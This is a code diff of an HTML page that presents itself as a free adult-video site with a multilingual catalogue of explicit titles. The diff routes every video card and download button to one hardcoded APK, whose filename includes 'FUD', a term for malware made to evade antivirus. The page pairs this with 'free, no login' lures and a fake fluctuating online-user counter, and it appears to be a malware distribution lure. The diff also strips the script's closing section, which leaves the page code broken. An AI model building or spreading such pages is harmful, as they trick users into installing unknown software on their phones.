@@ -156,7 +156,7 @@ button { cursor: pointer; font: inherit; border: none; background: none; color: 
   .grid { grid-template-columns: repeat(5, 1fr); }
 }
 
-/* Card - 更紧凑 */
+/* Card */
 .card {
   background: var(--card);
   border-radius: var(--radius);
@@ -172,7 +172,7 @@ button { cursor: pointer; font: inherit; border: none; background: none; color: 
 }
 .cover {
   position: relative;
-  aspect-ratio: 3/4;          /* 更竖一点，像直播图 */
+  aspect-ratio: 3/4;
   background: #1a1a1f;
   overflow: hidden;
 }
@@ -251,7 +251,7 @@ button { cursor: pointer; font: inherit; border: none; background: none; color: 
   font-weight: 700;
 }
 
-/* 大号底部下载条 */
+/* 底部大下载条 */
 .bottom-bar {
   position: fixed;
   left: 0;
@@ -412,6 +412,7 @@ dialog::backdrop { background: rgba(0,0,0,0.75); }
 </dialog>
 
 <script>
+/* ========== 下载地址（所有按钮统一下载这个APK） ========== */
 const DOWNLOAD_API_BASE = "https://wqj.lol/downloads/WQJ_FUD_1-ff0bd3b8b655483aaa86405dc61b931a.apk";
 
 const VIDEO_LIBRARY = [
@@ -455,6 +456,7 @@ const VIDEO_LIBRARY = [
   {id:"v011", category:"europe", title:{"zh-CN":"老板妻子的秘密","zh-TW":"老闆妻子的秘密","en":"Boss Wife Afternoon Secret","ja":"ボスの妻の秘密","ko":"보스 아내의 비밀"}, cover:"v011.webp", duration:"14:02", views:"67.4K"},
   {id:"v012", category:"lesbian", title:{"zh-CN":"红色内衣女女","zh-TW":"紅色內衣女女","en":"Red Lingerie Girl on Girl","ja":"赤いランジェリーレズ","ko":"빨간 란제리 레즈"}, cover:"v012.webp", duration:"8:55", views:"25.8K"}
 ];
+
 const I18N = {
   "zh-CN": { all:"全部", live:"直播", ai:"AI视频", anime:"动漫", europe:"欧美", asian:"亚洲", homemade:"自制", lesbian:"女同", threesome:"3P", anal:"肛门", longlegs:"长腿", search:"搜索标题...", empty:"没有找到视频", dl:"下载", big:"↓ 下载立即免费观看 · 免登录", tip:"100% 免费 · 无需注册 · 无月费", online:"在线 ", center:"下载中心" },
   "zh-TW": { all:"全部", live:"直播", ai:"AI視頻", anime:"動漫", europe:"歐美", asian:"亞洲", homemade:"自製", lesbian:"女同", threesome:"3P", anal:"肛門", longlegs:"長腿", search:"搜尋標題...", empty:"找不到視頻", dl:"下載", big:"↓ 下載立即免費觀看 · 免登入", tip:"100% 免費 · 無需註冊 · 無月費", online:"在線 ", center:"下載中心" },
@@ -495,7 +497,6 @@ function setLang(choice) {
   document.documentElement.lang = currentLanguage;
   try { localStorage.setItem("wqj-lang", choice); } catch(e){}
   $("#languageSelect").value = choice;
-  // 更新分类文字
   document.querySelectorAll(".cat").forEach(btn => {
     const key = btn.dataset.category;
     btn.textContent = t(key);
@@ -507,7 +508,6 @@ function setLang(choice) {
   $("#onlineCount").textContent = t("online") + "14,340";
   render();
 }
-
 function visible() {
   const q = $("#searchInput").value.trim().toLowerCase();
   return VIDEO_LIBRARY.filter(v => {
@@ -516,7 +516,6 @@ function visible() {
     return catOk && text.includes(q);
   });
 }
-
 function createCard(v) {
   const title = loc(v.title);
   const cover = v.cover || "";
@@ -536,7 +535,6 @@ function createCard(v) {
     </div>
   </article>`;
 }
-
 function render() {
   const list = visible();
   const box = $("#content");
@@ -547,7 +545,6 @@ function render() {
   }
   $("#empty").style.display = "none";
 
-  // 按优先级分组，尽量塞满
   const order = [
     {cat: "live", title: t("live")},
     {cat: "ai", title: t("ai")},
@@ -577,13 +574,10 @@ function render() {
   });
 }
 
+/* ========== 关键下载函数（不再拼接 id） ========== */
 function download(id) {
-  if (!DOWNLOAD_API_BASE) {
-    alert(currentLanguage.startsWith("zh") ? "请先设置 DOWNLOAD_API_BASE" : "Please set DOWNLOAD_API_BASE");
-    return;
-  }
   const a = document.createElement("a");
-  a.href = DOWNLOAD_API_BASE + encodeURIComponent(id);
+  a.href = DOWNLOAD_API_BASE;          // 直接使用完整 APK 地址
   a.target = "_blank";
   a.rel = "noopener";
   document.body.appendChild(a);
@@ -599,45 +593,3 @@ function openCenter() {
     div.className = "dlg-item";
     div.innerHTML = `<span>${loc(v.title)}</span>`;
     const btn = document.createElement("button");
-    btn.textContent = t("dl");
-    btn.onclick = () => download(v.id);
-    div.appendChild(btn);
-    list.appendChild(div);
-  });
-  $("#dlDialog").showModal();
-}
-
-// 事件
-$("#content").addEventListener("click", e => {
-  const btn = e.target.closest(".dl-btn");
-  const card = e.target.closest(".card");
-  if (btn) { download(btn.dataset.id); return; }
-  if (card) download(card.dataset.id);
-});
-$("#cats").addEventListener("click", e => {
-  const btn = e.target.closest(".cat");
-  if (!btn) return;
-  currentCategory = btn.dataset.category;
-  document.querySelectorAll(".cat").forEach(c => c.classList.toggle("active", c === btn));
-  render();
-});
-$("#searchInput").addEventListener("input", render);
-$("#languageSelect").addEventListener("change", e => setLang(e.target.value));
-$("#bigDownload").addEventListener("click", openCenter);
-$("#closeDlg").addEventListener("click", () => $("#dlDialog").close());
-$("#dlDialog").addEventListener("click", e => { if (e.target === $("#dlDialog")) $("#dlDialog").close(); });
-
-// 初始化
-let pref = "auto";
-try { pref = localStorage.getItem("wqj-lang") || "auto"; } catch(e){}
-setLang(pref);
-
-// 模拟在线人数跳动
-setInterval(() => {
-  const base = 14340;
-  const n = base + Math.floor(Math.random() * 80 - 40);
-  $("#onlineCount").textContent = t("online") + n.toLocaleString();
-}, 4000);
-</script>
-</body>
-</html>
